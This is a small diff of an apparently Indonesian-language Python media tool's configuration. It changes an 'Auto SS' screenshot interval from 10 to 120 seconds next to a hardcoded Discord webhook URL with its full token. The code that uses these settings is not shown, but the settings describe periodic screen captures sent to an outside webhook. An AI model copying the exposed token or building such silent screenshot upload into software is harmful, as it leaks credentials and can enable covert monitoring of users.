@@ -31,7 +31,7 @@ FORMAT_DIDUKUNG = ['.mp3', '.wav', '.ogg', '.m4a', '.mp4', '.webm']
 
 # Konfigurasi Auto SS (PATEN)
 WEBHOOK_URL = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
-AUTO_SS_INTERVAL = 10
+AUTO_SS_INTERVAL = 120
 
 # Warna
 class Warna:
